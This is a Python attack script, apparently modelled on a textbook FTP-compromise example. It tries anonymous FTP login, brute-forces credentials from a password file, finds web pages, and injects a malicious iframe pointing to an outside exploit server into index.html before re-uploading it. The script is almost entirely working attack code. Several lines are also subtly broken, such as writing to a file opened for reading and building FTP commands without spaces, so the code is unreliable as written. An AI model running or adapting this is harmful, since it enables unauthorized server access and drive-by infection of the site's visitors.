import ftplib

class Target():
    def __init__(self, ip: str) -> None:
        self.ip: str = ip
        self.ftp = ftplib.FTP(host=self.ip)

    def tryAnonLogin(self) -> bool:
        try:
            self.ftp.login(
                user="anonymous",
                passwd="",
                acct="me@your.com"
            )
            print(f"\n[*] {self.ip}\n[+] FTP Anonymous Logon Succeeded.")
            self.ftp.quit()
            return True
        except Exception as e:
            print(f"\n[-] {self.ip}\n[-] FTP Anonymous Logon Failed.")
            return False
    
    def bruteForceLogin(self, passwordFile: str) -> tuple[str, str]:
        with open(passwordFile, "r") as pF:
            for line in pF.readlines():
                username: str = line.split(":")[0]
                password: str = line.split(":")[1].strip("\r").strip("\n")
                print(f"\n[*] Trying: {username}:{password}")
                
                try:
                    self.ftp.login(user=username, passwd=password)
                    print(f"\n[*] {self.ip}\n[+] FTP Logon Succeeded: {username}:{password}")
                    self.ftp.quit()
                    return (username, password)
                except Exception as e:
                    pass
        print(f"\n[-] Could not brute force FTP credentials.")
        return "", ""
    
    def checkForWebPages(self, username: str, password: str) -> list[str]:
        try:
            self.ftp.login(user=username, passwd=password)
            dirList = self.ftp.nlst()
        except:
            dirList: list[str] = []
            print("[-] Could not list directory contents.")
            print("[-] Skipping to next target.")
            return []
        retList = []
        for fileName in dirList:
            fN: str = fileName.lower()
            if ".php" in fN or ".htm" in fN or ".asp" in fN:
                print(f"[+] Found default page: {fileName}")
                retList.append(fileName)
        return retList
    
    def injectWebPage(self, fileName: str, redirect: str) -> None:
        with open(fileName, "r") as f:
            self.ftp.retrlines(cmd="RETR"+fileName, callback=f.write)
            print(f"[+] Downloaded Page: {fileName}")
            
            f.write(redirect)
        print(f"[+] Injected Malicious IFrame on: {fileName}")
        
        self.ftp.storlines("STOR"+fileName, fp=open(fileName + ".tmp"))
        print(f"[+] Uploaded Injected Page: {fileName}")

def main() -> None:
    target: Target = Target("192.168.1.10")
    
    target.tryAnonLogin()
    username, password = target.bruteForceLogin(passwordFile="userpass.txt")
    target.checkForWebPages(username=username, password=password)
    
    redirect: str = "<iframe src='http://10.10.10.112:8080/exploit'></iframe>"
    target.injectWebPage(fileName="index.html", redirect=redirect)
    

if __name__ == "__main__":
    main()


